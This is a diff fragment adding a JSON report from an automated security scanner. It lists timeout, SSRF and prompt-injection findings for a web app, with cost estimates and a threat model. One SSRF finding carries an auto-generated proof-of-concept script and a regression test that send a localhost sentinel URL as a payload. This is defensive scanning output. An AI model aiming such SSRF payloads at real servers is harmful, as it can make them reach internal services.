+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/verification/run/route.ts:38` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "f31184c2f0ec560b",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/verification/run/route.ts",
+      "line": 83,
+      "snippet": "const tokenRes = await fetch(discovery.token_endpoint, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/verification/run/route.ts:83` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "d98b17d7c483fcd7",
+      "kind": "logic",
+      "severity": "medium",
+      "vuln": "Missing Timeout on Outbound HTTP Request (DoS)",
+      "cwe": "CWE-400",
+      "stride": "Denial of Service",
+      "file": "api/verification/run/route.ts",
+      "line": 229,
+      "snippet": "const resultRes = await fetch(`${openeoApiBase}/result`, {",
+      "fix": {
+        "description": "Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",
+        "code": "// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"
+      },
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage",
+        "confidence": "low",
+        "narrative": "Missing Timeout on Outbound HTTP Request (DoS) on `api/verification/run/route.ts:229` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 LLM chatbot DoS → court-ordered refunds + reputational damage."
+      },
+      "parser": "LOGIC",
+      "family": null
+    },
+    {
+      "id": "profile/page.tsx:246:143:SSRF",
+      "kind": "sast",
+      "severity": "low",
+      "vuln": "SSRF",
+      "cwe": "CWE-918",
+      "owaspLlm": null,
+      "stride": "Spoofing",
+      "file": "profile/page.tsx",
+      "line": 246,
+      "snippet": "<input type=\"text\" value={form.fullName} onChange={(e) => setForm({ ...form, fullName: e.target.value })}",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.204,
+      "toxicity": 53,
+      "toxicityFactors": [
+        "unauth-route-reachable",
+        "http-facing"
+      ],
+      "toxicityLabel": "Elevated",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "credentials"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 24000,
+        "dollarLikely": 138000,
+        "dollarWorst": 777500,
+        "dollarLow": 24000,
+        "dollarHigh": 777500,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 1000,
+            "likely": 3000,
+            "high": 12500
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)",
+        "confidence": "low",
+        "narrative": "SSRF on `profile/page.tsx:246` could expose production credentials and API keys. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $24k · likely $138k · worst $778k. Dominant driver: legal counsel. Comparable: Capital One 2019 SSRF → $190M settlement (100M records, $1.90/rec)."
+      },
+      "stableId": "3eb6046ca0ace470",
+      "confidenceTier": "very-low",
+      "exploitability": 0,
+      "exploitabilityTier": "low",
+      "exploitabilityFactors": [
+        "sev:low",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": true,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "ssrf",
+      "parser": "REGEX",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": {
+        "lang": "node",
+        "framework": "jest",
+        "filename": "security_3eb6046ca0ace470.test.mjs",
+        "runHint": "npx jest",
+        "code": "// Regression test for SSRF (CWE-918).\n// Auto-generated from P1.1 PoC; fails on vulnerable code, passes after the fix.\n\nimport { test, expect } from '@jest/globals';\n\ntest('SSRF', async () => {\n  const URL_ = \"http://localhost:3000/api/farmer-id/upload-url\";\n  const METHOD = \"GET\";\n  const PAYLOAD = \"http://127.0.0.1:65533/poc-ssrf-sentinel\";\n  const body = METHOD === 'GET' ? null : JSON.stringify({ input: PAYLOAD });\n  const reqUrl = METHOD === 'GET'\n    ? URL_ + (URL_.includes('?') ? '&' : '?') + 'input=' + encodeURIComponent(PAYLOAD)\n    : URL_;\n  const r = await fetch(reqUrl, { method: METHOD, headers: { 'Content-Type': 'application/json' }, body });\n  const text = await r.text();\n  // The assertion below is the \"exploit demonstrated\" signal — when this\n  // test PASSES, the vuln is still present. After the fix, this assertion\n  // SHOULD fail. Inverse the assertion in a green build.\n  const demonstrated = text.includes('PoC') || /syntax error/i.test(text) || text.includes('<script>');\n  expect(demonstrated).toBe(false);\n});\n"
+      },
+      "poc": {
+        "lang": "node",
+        "kind": "http-payload",
+        "cwe": "CWE-918",
+        "family": "ssrf",
+        "runHint": "node poc.mjs",
+        "code": "// Demonstrates SSRF by forcing the server to fetch a localhost sentinel URL.\n// Endpoint:   GET http://localhost:3000/api/farmer-id/upload-url\n// Payload:    http://127.0.0.1:65533/poc-ssrf-sentinel\n// Expect:     sentinel server logs a request from the target — proves the target made an outbound call we controlled\n// Run:        node poc.mjs\n// Exit code:  0 = exploit demonstrated, 1 = not demonstrated, 2 = error\n\nconst URL_ = \"http://localhost:3000/api/farmer-id/upload-url\";\nconst METHOD = \"GET\";\nconst PAYLOAD = `http://127.0.0.1:65533/poc-ssrf-sentinel`;\n\nconst body = METHOD === 'GET'\n  ? null\n  : JSON.stringify({ \"type\": PAYLOAD });\n\nconst headers = { 'Content-Type': 'application/json' };\n\nconst reqUrl = METHOD === 'GET'\n  ? URL_ + (URL_.includes('?') ? '&' : '?') + \"type\" + '=' + encodeURIComponent(PAYLOAD)\n  : URL_;\n\ntry {\n  const r = await fetch(reqUrl, { method: METHOD, headers, body, redirect: 'follow' });\n  const text = await r.text();\n  const sig = (text.includes(\"http://127.0.0.1:65533/poc-ssrf-sentinel\") ? 'payload reflected' : '');\n  if (sig) {\n    process.stderr.write('PoC: exploit demonstrated — ' + sig + '\\n');\n    process.exit(0);\n  }\n  process.stderr.write('PoC: payload sent (status ' + r.status + '), no exploit evidence in response\\n');\n  process.exit(1);\n} catch (e) {\n  process.stderr.write('PoC: error reaching target — ' + e.message + '\\n');\n  process.exit(2);\n}\n",
+        "paramKey": "type",
+        "paramKeyConfidence": "medium",
+        "paramKeyInferred": false
+      },
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 24,
+      "calibration_reason": "insufficient-samples",
+      "verifier_verdict": "verified-sanitizer-absence",
+      "verifier_reason": "no-sanitizer-in-window",
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0,
+      "crownJewelTier": "unknown",
+      "crownJewelFactors": [],
+      "cloneClusterId": "dc5b5281b29fe1af",
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0.28,
+      "typeNarrowed": null,
+      "strideCategory": "tampering",
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.4,
+          "tier": "medium",
+          "factors": [
+            "sev:low",
+            "bias:ssrf+0.20"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.5,
+          "tier": "medium",
+          "factors": [
+            "sev:low",
+            "bias:ssrf+0.30"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "apt-nation-state",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "apt-nation-state",
+      "personaMaxScore": 0.5,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/ssrf",
+        "ruleId": "CWE-918",
+        "parser": "REGEX",
+        "evidence": {
+          "sinkSnippet": "const putRes = await fetch(data.uploadUrl, { method: \"PUT\", headers: { \"Content-Type\": file.type, \"x-goog-content-length-range\": `0,10485760` }, body: file });",
+          "sourceSnippet": "<input type=\"text\" value={form.fullName} onChange={(e) => setForm({ ...form, fullName: e.target.value })}",
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "demoted",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "unknown",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": {
+        "low": 0,
+        "likely": 30,
+        "high": 100,
+        "program": "web2"
+      },
+      "bountyConfidence": "high",
+      "attackPlaybook": null
+    },
+    {
+      "id": "llm-redteam:userInputInSystem:api/ai/chat/route.ts:46",
+      "kind": "sast",
+      "severity": "low",
+      "vuln": "User input concatenated into system prompt — direct prompt injection",
+      "cwe": "CWE-77",
+      "owaspLlm": null,
+      "stride": null,
+      "file": "api/ai/chat/route.ts",
+      "line": 46,
+      "snippet": "{ role: \"system\", content: systemPrompt },",
+      "fix": null,
+      "reachable": false,
+      "triage": 39,
+      "dataClasses": [],
+      "chain": null,
+      "confidence": 0.204,
+      "toxicity": 3,
+      "toxicityFactors": [],
+      "toxicityLabel": "Low",
+      "sources": null,
+      "epssScore": null,
+      "epssPercentile": null,
+      "epssCve": null,
+      "exploitedNow": false,
+      "tags": null,
+      "blastRadius": {
+        "scope": "all-users",
+        "dataAtRisk": [
+          "config"
+        ],
+        "userCount": 50,
+        "industry": "generic",
+        "jurisdictions": [],
+        "controlsApplied": [],
+        "dollarBest": 23250,
+        "dollarLikely": 136250,
+        "dollarWorst": 775000,
+        "dollarLow": 23250,
+        "dollarHigh": 775000,
+        "components": {
+          "incidentResponse": {
+            "low": 8000,
+            "likely": 50000,
+            "high": 250000
+          },
+          "legal": {
+            "low": 10000,
+            "likely": 75000,
+            "high": 500000
+          },
+          "crisisPR": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "notification": {
+            "low": 5000,
+            "likely": 10000,
+            "high": 15000
+          },
+          "creditMonitoring": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "regulatoryFines": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "directDamage": {
+            "low": 250,
+            "likely": 1250,
+            "high": 10000
+          },
+          "classAction": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          },
+          "lostBusiness": {
+            "low": 0,
+            "likely": 0,
+            "high": 0
+          }
+        },
+        "dominantDriver": "legal counsel",
+        "comparable": "Air Canada 2024 chatbot prompt injection → binding refund obligations",
+        "confidence": "low",
+        "narrative": "User input concatenated into system prompt — direct prompt injection on `api/ai/chat/route.ts:46` could expose configuration / internal data. Context: general SaaS / no specific regulatory exposure. Estimated cost: best $23k · likely $136k · worst $775k. Dominant driver: legal counsel. Comparable: Air Canada 2024 chatbot prompt injection → binding refund obligations."
+      },
+      "stableId": "ee80f1ce1f287eca",
+      "confidenceTier": "very-low",
+      "exploitability": 0,
+      "exploitabilityTier": "low",
+      "exploitabilityFactors": [
+        "sev:low",
+        "unreachable"
+      ],
+      "clusterSize": null,
+      "unreachable": true,
+      "validator_verdict": "unvalidated",
+      "llm_confidence": null,
+      "unvalidated": true,
+      "cross_language": false,
+      "family": "user-input-concatenated-into-system-prom",
+      "parser": "REGEX",
+      "_unsigned": false,
+      "_passThroughSigning": false,
+      "signatureStatus": "verified",
+      "regression_test": null,
+      "poc": null,
+      "calibrated_confidence": null,
+      "calibrated_confidence_ci": null,
+      "calibrated_n": 0,
+      "calibration_reason": "no-history",
+      "verifier_verdict": "cannot-verify",
+      "verifier_reason": "no-poc-no-sanitizer-rule",
+      "verifier_runner": null,
+      "narration": null,
+      "mitigationVerdict": "unreachable-in-prod",
+      "mitigationsApplied": [],
+      "mitigatedByWaf": false,
+      "wafRuleId": null,
+      "mitigatedByAuth": false,
+      "authMechanism": null,
+      "mitigatedByNetwork": false,
+      "networkExposure": null,
+      "featureFlag": null,
+      "featureFlagState": null,
+      "featureFlagRollout": null,
+      "exposedInProd": false,
+      "unreachableInProd": true,
+      "coldPath": false,
+      "hotPath": false,
+      "prodRequestCount": null,
+      "crownJewelScore": 0.1,
+      "crownJewelTier": "low-value",
+      "crownJewelFactors": [
+        "reads-secret-env"
+      ],
+      "cloneClusterId": "48495346b096d60e",
+      "cloneClusterSize": 1,
+      "provenance": "human-likely",
+      "provenanceScore": 0.1,
+      "typeNarrowed": null,
+      "strideCategory": "tampering",
+      "personaScores": {
+        "script-kiddie": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        },
+        "opportunistic-criminal": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        },
+        "apt-nation-state": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        },
+        "supply-chain-attacker": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        },
+        "malicious-insider": {
+          "score": 0.2,
+          "tier": "low",
+          "factors": [
+            "sev:low"
+          ]
+        }
+      },
+      "personaTopTwo": [
+        "script-kiddie",
+        "opportunistic-criminal"
+      ],
+      "personaMaxName": "script-kiddie",
+      "personaMaxScore": 0.2,
+      "reverseExposure": null,
+      "specMined": null,
+      "whyFired": {
+        "detector": "sast/user-input-concatenated-into-system-prom",
+        "ruleId": "CWE-77",
+        "parser": "REGEX",
+        "evidence": {
+          "sinkSnippet": "{ role: \"system\", content: systemPrompt },",
+          "sourceSnippet": null,
+          "pathSteps": [],
+          "sanitizers": [],
+          "guards": []
+        },
+        "considered": {
+          "suppressionsApplied": [],
+          "suppressionsSkipped": [],
+          "reachabilityFilter": "demoted",
+          "clusterCollapsed": false,
+          "typeNarrowed": false,
+          "crownJewelTier": "low-value",
+          "mitigationVerdict": "unreachable-in-prod"
+        },
+        "scanner": {
+          "rulesetVersion": null,
+          "packHash": null,
+          "modelId": null
+        }
+      },
+      "adversaryTranscript": null,
+      "predictedBountyUsd": null,
+      "bountyConfidence": null,
+      "attackPlaybook": null
+    }
+  ],
+  "bundles": [
+    {
+      "bundleId": "bundle:method:SSRF",
+      "vuln": "SSRF",
+      "sinkType": "Outbound HTTP",
+      "sharedHelper": "method",
+      "childCount": 4,
+      "childIds": [
+        "api/openeo/route.ts:62:68:SSRF",
+        "api/verification/run/route.ts:77:83:SSRF",
+        "api/verification/run/route.ts:77:229:SSRF",
+        "profile/page.tsx:246:143:SSRF"
+      ],
+      "severity": "high",
+      "cwe": "CWE-918",
+      "summary": "4 SSRF findings share `method`. Refactor at the helper for one patch, 4 resolutions."
+    }
+  ],
+  "routes": [
+    {
+      "method": "GET",
+      "path": "/api/stellar",
+      "framework": "API",
+      "file": "aid/page.tsx",
+      "line": 28,
+      "hasAuth": false,
+      "hasFileUpload": false,
+      "params": [],
+      "classifications": [],
+      "classifiedFields": {}
+    },
+    {
+      "method": "GET",
+      "path": "/api/stellar",
+      "framework": "API",
+      "file": "explore/ExploreWorkspace.tsx",
+      "line": 298,
+      "hasAuth": false,
+      "hasFileUpload": false,
+      "params": [],
+      "classifications": [],
+      "classifiedFields": {}
+    },
+    {
+      "method": "GET",
+      "path": "/api/stellar",
+      "framework": "API",
+      "file": "order/page.tsx",
+      "line": 27,
+      "hasAuth": false,
+      "hasFileUpload": false,
+      "params": [],
+      "classifications": [],
+      "classifiedFields": {}
+    },
+    {
+      "method": "GET",
+      "path": "/api/stellar",
+      "framework": "API",
+      "file": "profile/page.tsx",
+      "line": 57,
+      "hasAuth": false,
+      "hasFileUpload": false,
+      "params": [],
+      "classifications": [],
+      "classifiedFields": {}
+    },
+    {
+      "method": "GET",
+      "path": "/api/farmer-id/upload-url",
+      "framework": "API",
+      "file": "profile/page.tsx",
+      "line": 136,
+      "hasAuth": false,
+      "hasFileUpload": false,
+      "params": [],
+      "classifications": [],
+      "classifiedFields": {}
+    }
+  ],
+  "components": [],
+  "suppressedCount": 6,
+  "blastRadiusSignals": {
+    "industry": "generic",
+    "industryConfidence": "low",
+    "jurisdictions": [],
+    "controls": [],
+    "estimatedUsers": 50,
+    "revenueIndicator": "pre-revenue",
+    "hasStripe": false,
+    "hasAuth": false,
+    "hasUserTable": false,
+    "hasPII": false,
+    "hasPHI": false,
+    "hasS3": false
+  },
+  "_v3": {
+    "counterfactual": {
+      "spofControls": [],
+      "controlsDetected": 396
+    },
+    "threatModel": {
+      "summary": {
+        "assetCount": 5,
+        "boundaryCount": 0,
+        "strideCounts": {
+          "spoofing": 0,
+          "tampering": 5,
+          "repudiation": 0,
+          "informationDisclosure": 0,
+          "denialOfService": 0,
+          "elevationOfPrivilege": 0
+        }
+      },
+      "assets": [
+        {
+          "name": "OPENEO_CLIENT_SECRET",
+          "file": "api/openeo/route.ts",
+          "line": 23,
+          "category": "secret",
+          "exposure": "internal"
+        },
+        {
+          "name": "NVIDIA_API_KEY",
+          "file": "api/ai/chat/route.ts",
+          "line": 4,
+          "category": "secret",
+          "exposure": "internal"
+        },
+        {
+          "name": "NVIDIA_API_KEY",
+          "file": "api/ai/ndvi-summary/route.ts",
+          "line": 4,
+          "category": "secret",
+          "exposure": "internal"
+        },
+        {
+          "name": "session",
+          "file": "api/verification/run/route.ts",
+          "line": 179,
+          "category": "session",
+          "exposure": "internal"
+        },
+        {
+          "name": "OPENEO_CLIENT_SECRET",
+          "file": "api/verification/run/route.ts",
+          "line": 57,
+          "category": "secret",
+          "exposure": "internal"
+        }
+      ],
+      "trustBoundaries": [],
+      "stride": {
+        "spoofing": [],
+        "tampering": [
+          {
+            "vuln": "SSRF",
+            "file": "profile/page.tsx",
+            "severity": "low"
+          },
+          {
+            "vuln": "SSRF",
+            "file": "api/openeo/route.ts",
+            "severity": "high"
+          },
+          {
+            "vuln": "SSRF",
+            "file": "api/verification/run/route.ts",
+            "severity": "high"
+          },
+          {
+            "vuln": "SSRF",
+            "file": "api/verification/run/route.ts",
+            "severity": "high"
+          },
+          {
+            "vuln": "User input concatenated into system prompt — direct prompt injection",
+            "file": "api/ai/chat/route.ts",
+            "line": 46,
+            "severity": "low"
+          }
+        ],
+        "repudiation": [],
+        "informationDisclosure": [],
+        "denialOfService": [],
+        "elevationOfPrivilege": []
+      }
+    },
+    "trustBoundaryDiagram": {
+      "mermaid": "flowchart LR\n  INTERNET((Internet))\n  APP[\"Application\"]\n  asset_secret_OPENEO_CLIENT_SECRET[/\"secret: OPENEO_CLIENT_SECRET\"/]\n  asset_secret_NVIDIA_API_KEY[/\"secret: NVIDIA_API_KEY\"/]\n  asset_session_session[/\"session: session\"/]\n  APP -->|asset| asset_secret_OPENEO_CLIENT_SECRET\n  APP -->|asset| asset_secret_NVIDIA_API_KEY\n  APP -->|asset| asset_secret_NVIDIA_API_KEY\n  APP -->|asset| asset_session_session\n  APP -->|asset| asset_secret_OPENEO_CLIENT_SECRET\n  classDef sev_critical fill:#ffcccc,stroke:#a00,stroke-width:2px;\n  classDef sev_high fill:#ffe0b2,stroke:#c60,stroke-width:2px;\n  classDef sev_medium fill:#fff3cd,stroke:#a80;\n  classDef sev_low fill:#e8eaf6,stroke:#557;",
+      "nodes": [
+        {
+          "id": "INTERNET",
+          "kind": "external",
+          "label": "Internet"
+        },
+        {
+          "id": "APP",
+          "kind": "app",
+          "label": "Application"
+        },
+        {
+          "id": "asset_secret_OPENEO_CLIENT_SECRET",
+          "kind": "asset",
+          "label": "secret: OPENEO_CLIENT_SECRET"
+        },
+        {
+          "id": "asset_secret_NVIDIA_API_KEY",
+          "kind": "asset",
+          "label": "secret: NVIDIA_API_KEY"
+        },
+        {
+          "id": "asset_session_session",
+          "kind": "asset",
+          "label": "session: session"
+        }
+      ],
+      "edges": [
+        {
+          "from": "APP",
+          "to": "asset_secret_OPENEO_CLIENT_SECRET",
+          "kind": "asset"
+        },
+        {
+          "from": "APP",
+          "to": "asset_secret_NVIDIA_API_KEY",
+          "kind": "asset"
+        },
+        {
+          "from": "APP",
+          "to": "asset_secret_NVIDIA_API_KEY",
+          "kind": "asset"
+        },
+        {
+          "from": "APP",
+          "to": "asset_session_session",
+          "kind": "asset"
+        },
+        {
+          "from": "APP",
+          "to": "asset_secret_OPENEO_CLIENT_SECRET",
+          "kind": "asset"
+        }
+      ],
+      "decorations": []
+    },
+    "calibrationDrift": {
+      "alarms": [],
+      "note": "no-feedback-data"
+    }
+  },
+  "annotatorErrors": []
+}
